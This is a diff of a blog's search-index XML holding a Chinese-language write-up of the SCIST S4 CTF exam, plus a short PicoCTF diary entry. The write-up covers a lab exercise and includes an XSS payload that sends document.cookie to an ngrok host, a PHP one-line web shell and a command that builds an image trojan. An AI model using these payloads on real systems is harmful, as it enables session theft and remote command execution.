@@ -254,6 +254,119 @@
       </categories>
   </entry>
   <entry>
+    <title>SCIST S4 資訊安全期末考 Writeup</title>
+    <url>/CyberSec/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/</url>
+    <content><![CDATA[<p>我在 2024 參加了 SCIST 課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的 Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！</p>
+<h1 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h1><p>這題我們可以從開發者工具發現類似以下的元素。</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;key--double&quot;</span> <span class="attr">data-key</span>=<span class="string">&quot;49&quot;</span> <span class="attr">data-input</span>=<span class="string">&quot;?F&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>!<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>再透過以下的 index.js 代碼可以找到真正的 input。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key.<span class="title function_">hasAttribute</span>(<span class="string">&quot;data-input&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">shiftKey</span>) &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        typingElement.<span class="property">innerHTML</span> = msg.<span class="title function_">replace</span>(<span class="regexp">/ /g</span>, <span class="string">&quot;&amp;nbsp;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>每個標籤的 data-input 屬性是由兩個字符所組成，以上面的 html 標籤為例，當我們按著 shift 的時候按下數字 1 按鍵，實際的 input 會是<code>?</code>，也就是 index 為 0 的位置；但當我們只是單純按下數字 1 按鍵的時候，input 會是<code>F</code>，就是 index 為 1 的位置。</p>
+<p>知道了這個特性後，翻找到一份 index.css 文件，將其打開會發現第一行有個註解，以下:</p>
+<div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Passpharse : &quot;JP Jf3j-F@%#$4H%xw&quot; */</span></span><br></pre></td></tr></table></figure></div>
+
+<p>我們用一般打字的方法，用 shift 切換大小寫，嘗試輸入 Passphrase。經過以上的轉換，便可以得到 flag。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag = SCIST&#123;G0oD_1u(k_!&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="XSSER"><a href="#XSSER" class="headerlink" title="XSSER"></a>XSSER</h1><p>看了題目給的 app.js 檔案，可以發現 Flag 是在 visit 函數裡面被設定的，如下。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">noteId</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://127.0.0.1:3000/note/<span class="subst">$&#123;noteId&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Visiting <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>()</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="attr">value</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="attr">httpOnly</span>: <span class="literal">false</span>, <span class="attr">secure</span>: <span class="literal">false</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;Lax&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span> &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`[+] error visting <span class="subst">$&#123;path&#125;</span> `</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    <span class="keyword">await</span> context.<span class="title function_">close</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>而要觸發這個 visit 函數，必須在回報 note 的地方輸入一個正確合法的 ID，才會執行 visit 函數，程式碼如下。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">NOTES</span>.<span class="title function_">has</span>(id)) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Note not found&quot;</span>);</span><br><span class="line">    <span class="title function_">visit</span>(id);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Admin will check your report&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>接著先在網站嘗試隨意 POST 一個正常的 note，會發現網址變成了以下的形式。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://lab.scist.org:20001/note/732733d42c28d7060c71be53a4dd491b</span><br></pre></td></tr></table></figure></div>
+
+<p>其中”note&#x2F;“路徑後面的<code>1e9dafbc67ea0516bacce8d5d36a3c7a</code>，便是一個合法的 note ID。</p>
+<p>到了這邊，我原本以為是要把合法的 ID 和 XSS 的 payload 結合在一起，並在 Report 的地方提交。但經過助教的提示之後，知道應該是要把 payload 提交在 note 的內文，所以我開始重新研究一次 app.js 的程式碼。發現了之前沒仔細看到可能可以注入 XSS 的地方，如下。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/note/:noteId&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> noteId = req.<span class="property">params</span>.<span class="property">noteId</span>;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="variable constant_">NOTES</span>.<span class="title function_">get</span>(noteId);</span><br><span class="line">    <span class="keyword">if</span> (!note) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Note not found!&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`&lt;h1&gt;Your Note&lt;h1&gt;&lt;p id=&quot;note&quot;&gt;<span class="subst">$&#123;note&#125;</span>&lt;/p&gt;`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>在這段程式碼中，可以看到我們提交的 note 會被夾在 p 標籤中解析，所以我嘗試注入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>發現不能執行，因為 app.js 裡面限制了允許的標籤白名單，只有 s、b、u、p、code 這五個標籤能使用，其餘的標籤會被 strip 掉。知道可以用的標籤後，我使用了 p 標籤提交，嘗試執行 javascript，payload 如下:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;p/onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;test&lt;p&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>發現 note 只會被解析成<code>test</code>，而移動滑鼠到上面的時候也確實會執行 js，因此接下來要做的就是修改 payload，並再提交 note 後去 report 的地方提交 id，讓 visit 去執行到我們提交的腳本，就可以得到 cookie 了。</p>
+<p>我用 ngrok 在本地先架了個伺服器，並且嘗試透過其獲取 cookie，payload 如下:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">&lt;p/onmouseover=document.location.href=&quot;https://1ffb-36-234-174-194.ngrok-free.app/&quot;+document.cookie style=&quot;position:fixed;left:0;top:0;width:9999px;height:9999px;&quot;&gt;test<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>但是因為 onmouseover 屬性需要有滑鼠滑過，即便我把 p 標籤調整的很大，但因為 visit 函數不會有滑鼠滑過，所以還是不會執行。很可惜到了截止的最後，還是沒能找出正確的 payload 獲取到 flag。</p>
+<p>最後來談談這個漏洞在真實世界可能的危害，題目在每次回報完後都會提示<code>admin will check your report</code>，這告訴我們如果真實世界中有人利用 XSS 漏洞注入了惡意代碼，而當系統管理員去”check”的時候，自己的 cookie 可能就會被利用，讓有心人士可以在不知道 admin 帳號密碼的情況下以 admin 的權限登入系統。</p>
+<h1 id="Uploader"><a href="#Uploader" class="headerlink" title="Uploader"></a>Uploader</h1><p>在這題裡面，我先嘗試上傳了一張正常的圖片，發現網頁會呈現這樣的狀態。<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/ByG6mhhcT.png"
+                     
+                ><br>我一開始先用了課程中教過的一句話木馬來嘗試上傳，我上傳的是 php 檔。</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>結果系統會回應<code>not a PNG file</code>，這表示前端會檢測是否為合法的上傳檔案類型，我又嘗試把檔名修改為<code>shell.php.png</code>再進行上傳，結果系統的回應是<code>Invalid image</code>，表示後端也有檢測他是否為 PNG 檔案。後來又嘗試了很多其他的方法，包括在 php payload 前面加上 magic numbers <code>89504E47</code>嘗試讓系統解析為 PNG 檔，但得到的回應都跟前面差不多。</p>
+<p>最後，在經過一番搜尋、查找資料後，發現只剩下一個方法，就是上傳圖片馬。所謂的圖片馬，就是把圖片和木馬組合在一起上傳。於是我準備了一張正常的 png(normal.png)和惡意的 php 代碼(shell.php)，將其放在同一個路徑底下。接著利用以下的指令將其組合為惡意圖片馬(pwn.png):</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy normal.png/b + shell.php/a pwn.png</span><br></pre></td></tr></table></figure></div>
+
+<p>接著我將 pwn.png 上傳，發現系統回應<code>Bad content</code>，到這邊，比賽就結束了，結果最後還是沒能成功地取得 Flag，QQ。</p>
+<h1 id="Common-modulus"><a href="#Common-modulus" class="headerlink" title="Common modulus"></a>Common modulus</h1><p>這題的題目給了三個 e(公鑰)，三個 c(密文)，還有一個 n(質數因子相乘)，如果有其中兩個 e 是互質，也就是 gcd(e1, e2) &#x3D; 1 的話，就可以利用一般的共模攻擊，去求得 m(明文)，就是利用會有一組 s1 和 s2 滿足 s1 _ e1 + s2 _ e2 &#x3D; 1 的條件，加上一點計算，去找出原本的 m，如下。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">已知 s1 * e1 + s2 * e2 = 1</span><br><span class="line">==========================</span><br><span class="line">c1 ^ s1 * c2 ^ s2 mod n</span><br><span class="line">= m ^ (e1 * s1) * m ^ (e2 * s2) mod n</span><br><span class="line">= m ^ (e1 * s1 + e2 * s2) mod n</span><br><span class="line">= m mod n</span><br><span class="line">= m</span><br></pre></td></tr></table></figure></div>
+
+<p>可惜這題的三個 e 都不是互質的，所以要用其他的方法，我就找到了<a class="link"   href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701" >一篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，裡面的方法是這樣:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcd(e1, e2) = gcd</span><br><span class="line">c1 = (m ^ e1&#x27;) ^ gcd mod n</span><br><span class="line">c2 = (m ^ e2&#x27;) ^ gcd mod n</span><br><span class="line">e1&#x27; * s1 + e2&#x27; * s2 = 1</span><br><span class="line"></span><br><span class="line">c1 ^ s1 * c2 ^s2 mod n</span><br><span class="line">= (((m ^ e1&#x27;) ^ gcd) ^ s1) * (((m ^ e2&#x27;) ^ gcd) ^s2) mod n</span><br><span class="line">= m ^ (e1&#x27; * s1 * gcd + e2&#x27; * s2 * gcd) mod n</span><br><span class="line">= m ^ gcd mod n</span><br></pre></td></tr></table></figure></div>
+
+<p>所以只要把最後算出來的 m 再開 gcd 次方根就能找到明文，於是我寫了下面的腳本。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, iroot, gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">22777210958276255973049562078823322470680917129996977683503001216538435863571279721754251786904659128777249694642787480739356668460290853226080964490087136228546045908347764486557698226166963415933243390587759408509357466384117429023536043020407223339909068182712164327318468662771341384255178839693851749833498595767285757850112681038669603653206881003854674152787778849201349140811383067441876396986225542868926178627083357794996583066978454919162611524965685485188287561894204743004599366796640463833284730895990140454443706509700257117888543581605105114423861683342316455500361042572686499019143155407840720672419</span></span><br><span class="line">e1 = <span class="number">2755481107</span></span><br><span class="line">e2 = <span class="number">3066037283</span></span><br><span class="line"><span class="comment"># e3 = 3825027809</span></span><br><span class="line">c1 = <span class="number">7927632180925780686814468716254548866073876571301670927803568567992929927231666309788681512003760545920706822481579873353923145930555620003462589361971404649174770107086295817994744475096856399932862153021335565923236506465046739212222528807145844779588311833022632475905272022533594289777471811000950934146066045472218603345107418836739010466236517799411565681939684720963118217633594133046157469386003057018852372681387318985149400851657988757739939640107583630568340335757129814894759082226790230350623403635880468479392207604875482436028050237168056669104984504520909514306552404757744266671282270481535254632231</span></span><br><span class="line">c2 = <span class="number">19162894772364755634695403163786451410245098251726628084799257554767334519905640179161346412307514221332891648206034353728374020165930677162860102377777681292582203157662333178388904577242217496599789741706061676944395451665239726479077741007297709368920091594846785681021427819585722029936761040901809601396670202192052497066209075288103228744858127970671076282164969113619499174358765991380757911727424305398346399701274033326030443722686643479760852934150701783998463047750118216160431187984416861424972003041835112849345069144579908117061092179552843173803432427193984945136248106420527309951492325647621839772126</span></span><br><span class="line"><span class="comment"># c3 = 12281989205300534636704612304895466894728582803084654071108548003638296732533233324118128443432186580642178421360358569501856887776677567285142630332770995470034693283004693504328569378601328550606731466373274474890323776647142155504550689141803732334439130044963732806927780975317712578470165550637007845813598338398021681428237912733055103663278507239375781432804708170722603762602715296180599171769475818480578806749013564273888734572033232825425951511959908980277564593244704622649568752985829748683356507419796438898916535864730103144986484287500764463579887673117770889298009984153867524175061353407719439002075</span></span><br><span class="line"></span><br><span class="line">g = gcd(e1, e2)</span><br><span class="line">e1_ = e1 // g</span><br><span class="line">e2_ = e2 // g</span><br><span class="line">l, s1, s2 = gcdext(e1_, e2_)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">m = iroot(m, g)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag = <span class="subst">&#123;long_to_bytes(m).decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>只不過最後的答案是錯誤的，沒能找到正確的 flag。可能是因為本題的 gcd 太大，還要找其他的算法。</p>
+<h1 id="參賽心得"><a href="#參賽心得" class="headerlink" title="參賽心得"></a>參賽心得</h1><p>這次算是我第一次花了那麼多的時間打 CTF 比賽，之前可能就是自己在網路上解解題甚麼的，總的來說還是很有趣的一次體驗。而參加完這次的比賽，我也更加地意識到自己的不足，真的還有很多可以進步、練習的地方。即便可能有點被打擊信心，但我也不會氣餒，我要更努力的練習，沒事就多解解題甚麼的，增強自己的實力，希望可以在之後的比賽表現得越來越好！</p>
+<h1 id="參考資料區"><a href="#參考資料區" class="headerlink" title="參考資料區"></a>參考資料區</h1><ul>
+<li><a class="link"   href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#/%E5%85%B6%E4%BB%96%E8%A7%84%E5%88%99" >文件上傳漏洞總結 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html" >PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE ! <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="https://ithelp.ithome.com.tw/articles/10245459?sc=hot" >[Day 26] 026 - 串流加密法 - Stream cipher <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1" >童舒晧資安資源整理(XSS 教學) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="https://xz.aliyun.com/t/3952?time__1311=n4+xnD0DBDgGG=G8+eDsA3xCqm/z3K3r34D&alichlgref=https://www.google.com/" >安全工具——XSSer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="https://blog.csdn.net/mydriverc2/article/details/42048983?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-42048983-blog-113249158.235%5Ev43%5Epc_blog_bottom_relevance_base9&spm=1001.2101.3001.4242.2&utm_relevant_index=2" >XSSer 使用(CSDN) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701" >关于 RSA 共模攻击 e1，e2 不互素的解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="https://blog.csdn.net/qq_40345591/article/details/127476867" >文件上传漏洞进阶教程&#x2F;白名单绕过&#x2F;图片马制作&#x2F;图片马执行 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CyberSec</category>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Security</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[Day 01] Grinding PicoCTF</title>
+    <url>/TechStreak30/2024%20CTF%20Training/Day-01-Grinding-PicoCTF/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因為已經有開了一篇文章，打算放上所有 picoCTF 的 writeups 了，所以就不把解題思路寫在這邊啦，如果想看的話請見<a href="https://cx330.tw/CyberSec/CTF/All-in-One%20PicoCTF-Writeups/">這邊</a>!</p>
+<h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><p>今天打算先刷一點 picoCTF 的題目，因為成大資安社加入戰隊的標準是一萬分，然後我現在才六千多。但是！當我今天開始刷題目之後我發現 pico 他們的制度整個大改！現在沒有計算分數的機制了，改為把題目分成三個不同的難度（像是 Leetcode 那樣），分別是 easy, medium, hard。所以不知道到時候加戰隊的標準會是多少呢，不過以下就是我今天的進度啦！</p>
+<ol>
+<li>More SQLi</li>
+<li>Trickster</li>
+</ol>
+<p>今天進度就兩題，不過感覺多多少少是有學習到新知識的。之後可能要找一天特別來研究一下 sqlmap 的文檔，到時候再出成一篇筆記文章吧！兩題可能聽起來有點少，但畢竟剛放暑假，我還在那個耍費狀態 XD，慢慢調整啦！</p>
+<h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul>
+<li>起床時間：<code>8:30</code></li>
+<li>知識量：⭐⭐⭐</li>
+<li>疲勞程度：⭐⭐</li>
+<li>精神狀態：⭐⭐⭐⭐⭐</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CyberSec</category>
+        <category>TechStreak30</category>
+        <category>CTF</category>
+        <category>2024 CTF Training</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>CyberSec</tag>
+        <tag>PicoCTF</tag>
+        <tag>TechStreak30</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>All-in-One PicoCTF Writeups</title>
     <url>/CyberSec/CTF/All-in-One%20PicoCTF-Writeups/</url>
     <content><![CDATA[
@@ -436,175 +549,6 @@
       </categories>
   </entry>
   <entry>
-    <title>SCIST S4 資訊安全期末考 Writeup</title>
-    <url>/CyberSec/CTF/SCIST-S4-%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83-Writeup/</url>
-    <content><![CDATA[<p>我在 2024 參加了 SCIST 課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的 Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！</p>
-<h1 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h1><p>這題我們可以從開發者工具發現類似以下的元素。</p>
-<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;key--double&quot;</span> <span class="attr">data-key</span>=<span class="string">&quot;49&quot;</span> <span class="attr">data-input</span>=<span class="string">&quot;?F&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>!<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>再透過以下的 index.js 代碼可以找到真正的 input。</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key.<span class="title function_">hasAttribute</span>(<span class="string">&quot;data-input&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">shiftKey</span>) &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        typingElement.<span class="property">innerHTML</span> = msg.<span class="title function_">replace</span>(<span class="regexp">/ /g</span>, <span class="string">&quot;&amp;nbsp;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>每個標籤的 data-input 屬性是由兩個字符所組成，以上面的 html 標籤為例，當我們按著 shift 的時候按下數字 1 按鍵，實際的 input 會是<code>?</code>，也就是 index 為 0 的位置；但當我們只是單純按下數字 1 按鍵的時候，input 會是<code>F</code>，就是 index 為 1 的位置。</p>
-<p>知道了這個特性後，翻找到一份 index.css 文件，將其打開會發現第一行有個註解，以下:</p>
-<div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Passpharse : &quot;JP Jf3j-F@%#$4H%xw&quot; */</span></span><br></pre></td></tr></table></figure></div>
-
-<p>我們用一般打字的方法，用 shift 切換大小寫，嘗試輸入 Passphrase。經過以上的轉換，便可以得到 flag。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag = SCIST&#123;G0oD_1u(k_!&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h1 id="XSSER"><a href="#XSSER" class="headerlink" title="XSSER"></a>XSSER</h1><p>看了題目給的 app.js 檔案，可以發現 Flag 是在 visit 函數裡面被設定的，如下。</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">noteId</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://127.0.0.1:3000/note/<span class="subst">$&#123;noteId&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Visiting <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>()</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="attr">value</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="attr">httpOnly</span>: <span class="literal">false</span>, <span class="attr">secure</span>: <span class="literal">false</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;Lax&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span> &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`[+] error visting <span class="subst">$&#123;path&#125;</span> `</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    <span class="keyword">await</span> context.<span class="title function_">close</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>而要觸發這個 visit 函數，必須在回報 note 的地方輸入一個正確合法的 ID，才會執行 visit 函數，程式碼如下。</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">NOTES</span>.<span class="title function_">has</span>(id)) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Note not found&quot;</span>);</span><br><span class="line">    <span class="title function_">visit</span>(id);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Admin will check your report&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
-
-<p>接著先在網站嘗試隨意 POST 一個正常的 note，會發現網址變成了以下的形式。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://lab.scist.org:20001/note/732733d42c28d7060c71be53a4dd491b</span><br></pre></td></tr></table></figure></div>
-
-<p>其中”note&#x2F;“路徑後面的<code>1e9dafbc67ea0516bacce8d5d36a3c7a</code>，便是一個合法的 note ID。</p>
